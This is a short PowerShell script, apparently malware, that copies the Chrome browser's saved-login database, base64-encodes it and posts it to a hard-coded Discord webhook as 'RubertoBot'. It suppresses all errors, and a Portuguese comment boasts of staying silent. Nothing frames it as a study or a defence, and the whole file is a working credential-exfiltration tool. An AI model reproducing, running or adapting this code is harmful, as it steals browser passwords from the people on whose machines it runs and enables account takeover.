$chromeLoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

if (Test-Path $chromeLoginDataPath) {
    try {
        $tempPath = "$env:TEMP\LoginDataCopy"
        Copy-Item $chromeLoginDataPath $tempPath -Force

        $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
        $base64Data = [Convert]::ToBase64String($fileBytes)

        $webhookUrl = "https://discord.com/api/webhooks/1376301491480166553/xPSHdTo8WCePCKODMgLKacH4xuyTfCIvs3sOF97DK-E6dQkEazXO2vG0Q8XXrFrmzRB0"

        $body = @{
            username = "RubertoBot"
            content = "```Base64 Chrome Login Data:`n$base64Data```"
        }

        Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body
    }
    catch {
        # Silêncio total. Ruberto é sombra.
    }
}
